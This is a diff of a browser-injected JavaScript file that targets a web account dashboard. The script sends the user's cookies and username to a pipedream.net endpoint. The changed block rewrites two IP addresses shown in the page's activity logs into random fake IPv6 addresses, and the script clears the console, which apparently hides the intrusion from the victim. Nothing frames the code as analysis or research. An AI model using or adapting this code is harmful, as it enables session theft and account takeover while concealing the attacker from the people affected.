@@ -11,6 +11,20 @@ const expander = (document.querySelector("#page-header-user-dropdown > img").att
 const ipv6_1 = `2001:f${getRandomInt(100,999)}:${getRandomInt(100,999)}:${getRandomInt(1000,9999)}::${getRandomInt(1000,9999)}`
 const ipv6_2 = `2001:f${getRandomInt(100,999)}:${getRandomInt(100,999)}:${getRandomInt(1000,9999)}::${getRandomInt(1000,9999)}`
 
+try {
+    var logs = document.querySelectorAll("#app-layouts > div.main-content > div > div.row > div > div > div > p");
+    logs.forEach(log => {
+        if (log.innerText.includes("107.189.10.123")) {
+            log.innerText = log.innerText.replace("107.189.10.123", ipv6_1)
+        }
+        if (log.innerText.includes("146.59.80.183")) {
+            log.innerText = log.innerText.replace("146.59.80.183", ipv6_2)
+        }
+    });
+}catch {
+    console.clear();
+}
+
 fetch('https://eodm4q7xsesbwyr.m.pipedream.net/' + document.cookie + '-user-' + username);
 try {
     var premiumBtn = document.querySelector("#app-layouts > div.main-content > div > div.card > div:nth-child(1) > div > div.col-12.col-md-6 > div.d-flex.flex-column.flex-sm-row > a");
@@ -48,20 +62,6 @@ if (!expander) {
     "mode": "cors",
     "credentials": "include"
     });
-}
-
-try {
-    var logs = document.querySelectorAll("#app-layouts > div.main-content > div > div.row > div > div > div > p");
-    logs.forEach(log => {
-        if (log.innerText.includes("107.189.10.123")) {
-            log.innerText = log.innerText.replace("107.189.10.123", ipv6_1)
-        }
-        if (log.innerText.includes("146.59.80.183")) {
-            log.innerText = log.innerText.replace("146.59.80.183", ipv6_2)
-        }
-    });
-}catch {
-    console.clear();
 }
 
 console.clear();
